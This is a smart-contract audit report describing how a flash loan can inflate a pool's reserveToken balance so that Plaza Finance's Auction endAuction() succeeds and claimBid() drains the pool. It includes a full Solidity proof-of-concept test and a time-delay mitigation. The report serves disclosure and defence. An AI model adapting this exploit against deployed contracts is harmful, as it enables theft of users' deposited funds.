# Attacker Can Drain All `reserveToken` Funds in the Pool

Likelihood : Medium 
Impact : High


### Description

Due to the way `endAuction()` and `claimBid()` are designed, a malicious actor can abuse a flash loan (or any form of temporary liquidity) to artificially inflate the Pool’s `reserveToken` balance in one transaction, thus tricking the Auction contract into successfully ending as `SUCCEEDED` instead of reverting with the `FAILED_POOL_SALE_LIMIT` state. This allows the attacker to claim all `reserveToken` funds from the Pool.

The high-level steps of the exploit are:

1. **Auction Near Expiry**  
   Wait until the auction is about to end (i.e., `block.timestamp >= endTime`). There must also be at least one bid slot available.

2. **Place Final Bid**

   - The attacker makes a final bid with an extremely large `buyReserveAmount` (`auction.MAX_BID_AMOUNT()` or similarly large value).
   - The `sellCouponAmount` only needs to be large enough to occupy a single bid slot (often the `slotSize()` or any minimal valid amount).

3. **Flash Loan & Balance Inflation**

   - Immediately after placing the bid (within the same transaction or in quick succession), the attacker acquires a flash loan of `reserveToken`.
   - The attacker sends these tokens temporarily into the Pool’s address (`pool`). This inflates the Pool’s `reserveToken` balance.

4. **Call `endAuction()`**

   - The standard check in `endAuction()` for a potential failure
   
     https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/Auction.sol#L341-L342

     would normally mark the auction as failed if the `totalSellReserveAmount` is too high relative to the Pool's reserve.
   - Because the attacker artificially increased the Pool’s `reserveToken` balance via the flash loan, the condition no longer triggers a revert or a `FAILED_POOL_SALE_LIMIT`. The auction instead proceeds to `SUCCEEDED`.

5. **Claim the Bid**

   - In a successful auction state, calling `claimBid(...)` transfers out the entire amount of `reserveToken` (i.e., `buyReserveAmount`) that was allocated for that winning bid.
   - The attacker now receives all the newly inflated `reserveToken` from the Pool.

6. **Repay Flash Loan**
   - The attacker repays the flash loan from the drained funds, walking away with any remainder as profit.
   - The Pool is left with little or no `reserveToken` balance.

### Proof of Concept

Below is a sample test scenario demonstrating the exploit. It shows how an attacker can inflate the Pool balance, call `endAuction()`, and then drain funds via `claimBid()`. Past this into `AuctionTest` :

```solidity

function setUp() public {
    usdc = new Token("USDC", "USDC", false);
    weth = new Token("WETH", "WETH", false);

    pool = createPool(address(weth), address(usdc));
    useMockPool(pool);

    vm.startPrank(pool);
    auction = Auction(
        Utils.deploy(
            address(new Auction()),
            abi.encodeWithSelector(
                Auction.initialize.selector,
                address(usdc),
                address(weth),
                1000000000000,
                block.timestamp + 10 days,
                300,                    //@audit maxBids (reduced from 1000)
                house,
                110
            )
        )
    );
    vm.stopPrank();
}

/**
 * Steps:
 *  1. Fill 299 out of 300 total bid slots with benign bids.
 *  2. The attacker places the final bid with a very large `buyReserveAmount`.
 *  3. Time advances past `auction.endTime()`.
 *  4. The attacker mints enough `reserveToken` (simulating a flash loan) to artificially inflate
 *     the Pool's balance.
 *  5. Calls `auction.endAuction()`, which checks the inflated balance and does not fail the auction.
 *  6. Attacker calls `auction.claimBid(...)` to drain the Pool.
 *  7. Attacker "repays" the flash loan by sending the borrowed tokens to another address.

function test_steal_auction_fund_0xRaz() public {
    address sendBackFlashLoan = makeAddr("sendBackFlashLoan");
    uint256 sizeAmount = auction.totalBuyCouponAmount() / auction.maxBids();

    // Setup the attacker
    address attacker = makeAddr("attacker");
    vm.label(attacker, "attacker");
    usdc.mint(attacker, sizeAmount * 10);

    // 299 bids to fill up the auction
    for (uint256 i = 0; i < 299; i++) {
        address newBidder = address(uint160(i + 1));
        vm.startPrank(newBidder);
        usdc.mint(newBidder, sizeAmount);
        usdc.approve(address(auction), sizeAmount);
        auction.bid(1 ether, sizeAmount);
        vm.stopPrank();
    }

    // Attacker places final bid with a very large buyReserveAmount
    vm.startPrank(attacker);
    usdc.approve(address(auction), sizeAmount * 10);
    auction.bid(auction.MAX_BID_AMOUNT(), sizeAmount * 2);

    // Advance time to end the auction
    vm.warp(auction.endTime() + 1);

    // Fetch relevant references
    IERC20 reserveToken = IERC20(address(auction.sellReserveToken()));
    address poolAdd = auction.pool();
    vm.label(poolAdd, "Pool address");

    // Calculate how many tokens are needed to artificially inflate the Pool balance
    uint256 amountToFlashLoan =
        auction.totalSellReserveAmount() - reserveToken.balanceOf(poolAdd);

    // Before-attack balances
    uint256 attackerBalanceBeforeFlashLoan = reserveToken.balanceOf(attacker);
    assertEq(
        attackerBalanceBeforeFlashLoan,
        0,
        "attacker should have 0 balance of reserveToken before the attack"
    );

    uint256 poolBalanceBeforeAttack = reserveToken.balanceOf(poolAdd);

    // "Flash loan" attack: simply mint to attacker & send to the Pool
    deal(address(auction.sellReserveToken()), attacker, amountToFlashLoan);
    reserveToken.transfer(poolAdd, amountToFlashLoan);

    // End the auction; check does not fail because of inflated pool balance
    auction.endAuction();

    // Attacker claims the bid to drain the pool
    auction.claimBid(300);

    // Attacker's new balance
    uint256 balanceAfterAttack = reserveToken.balanceOf(attacker);

    // Repay "flash loan" to a random address
    reserveToken.transfer(sendBackFlashLoan, amountToFlashLoan);

    // Final pool balance
    uint256 balancePoolAfterAttack = reserveToken.balanceOf(poolAdd);

    // Validations
    assertGt(
        balanceAfterAttack,
        0,
        "attacker should have balance of reserveToken after sending back the flash loan"
    );

    uint256 balanceAfterPayingBackFlashLoan = balanceAfterAttack - amountToFlashLoan;

    // Console logs
    console.log("Attacker balance before the flash Loan : ", attackerBalanceBeforeFlashLoan);
    console.log("Balance after paying back the flash Loan : ", balanceAfterPayingBackFlashLoan);
    console.log("Balance of the pool before the attack : ", poolBalanceBeforeAttack);
    console.log("Balance of the pool after the attack : ", balancePoolAfterAttack);
}

```

In this test:

- The final attacker’s bid is accepted despite an enormous `buyReserveAmount`.
- By temporarily sending tokens to the Pool, the check in `endAuction()` does not fail the auction.
- The attacker can then call `claimBid()` and drain the artificially inflated reserve, repaying the flash loan afterward.

### Impact

- **Complete Loss of Funds**: The Pool’s entire `reserveToken` balance can be drained in a single transaction.
- **Minimal Capital Requirement**: The attacker only needs enough `couponToken` (i.e., USDC in the example) to place a bid, and can rely on a flash loan or any short-term liquidity to inflate the Pool.
- **Users’ Assets at Risk**: All legitimate deposits in the Pool are effectively stolen.

### Recommended Mitigation

One simple approach is **splitting the `endAuction()` and reserve transfer logic** into two separate transactions with a mandatory time delay in between. That is:

1. **Transaction 1**: Mark the auction as ended (updating the `state`), but do **not** immediately transfer `reserveToken`.
2. **Transaction 2**: Some reasonable time later (e.g., a time-lock or separate block), execute the actual transfer of `reserveToken` to winning bidders.

By introducing a delay, attackers cannot complete the entire flash-loan-based inflation and immediate payout in a single atomic transaction. This significantly raises the cost and complexity of the exploit and protects the Pool’s reserves in the interim.
